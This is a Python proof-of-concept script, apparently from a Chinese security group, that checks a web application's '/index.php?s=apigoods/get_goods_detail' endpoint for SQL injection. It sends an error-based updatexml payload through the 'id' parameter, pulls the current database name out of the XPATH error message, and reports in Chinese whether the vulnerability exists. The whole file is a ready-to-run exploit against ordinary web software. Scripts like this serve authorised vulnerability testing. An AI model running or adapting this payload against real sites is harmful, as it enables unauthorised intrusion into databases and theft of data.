#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    #print(r.text)
    if "XPATH" in r.text:
        info = re.findall("'~([^']+)~'", r.text)
        if len(info) != 0:
            return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行paylaod: updatexml(1,concat(0x7e,database(),0x7e) 结果为：", info)
    else:
        print("[-]漏洞不存在")
